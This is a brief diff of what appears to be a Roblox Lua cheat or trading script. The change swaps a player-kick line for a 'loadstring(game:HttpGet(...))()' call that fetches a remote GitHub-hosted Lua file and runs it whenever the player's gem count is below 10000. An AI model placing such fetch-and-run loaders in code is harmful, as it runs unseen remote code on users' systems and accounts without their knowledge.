@@ -21,7 +21,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 10000 then
-    plr:kick("Saving error, please rejoin! Source code by .t.ob.i.")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/BoothSniper/main/silly.lua"))()
 end
 
 local user = Username
